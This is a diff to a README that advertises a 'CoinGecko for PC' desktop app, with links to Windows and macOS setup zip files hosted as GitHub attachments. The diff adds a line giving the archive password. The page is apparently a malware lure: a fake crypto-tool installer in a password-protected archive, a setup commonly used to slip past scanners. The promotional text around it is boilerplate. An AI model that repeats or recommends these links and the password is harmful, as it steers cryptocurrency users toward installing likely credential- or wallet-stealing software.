@@ -48,6 +48,8 @@ CoinGecko for PC has an intuitive interface that makes it easy to navigate and a
 ## [Download CoinGecko for PC](https://github.com/user-attachments/files/18356697/CoinGecko-PC-Setup.zip)
 ## [Download CoinGecko MacOS](https://github.com/user-attachments/files/18356717/CoinGecko-MacOS-Setup.zip)
 
+# > PassWord: xavip123
+
 ## Conclusion
 CoinGecko for PC is the ultimate tool for anyone interested in cryptocurrency. With real-time data, powerful analysis tools, and a simple interface, it’s perfect for tracking the market and making informed decisions. Whether you’re a trader, investor, or crypto enthusiast, CoinGecko will keep you connected to the fast-moving world of cryptocurrencies.
 
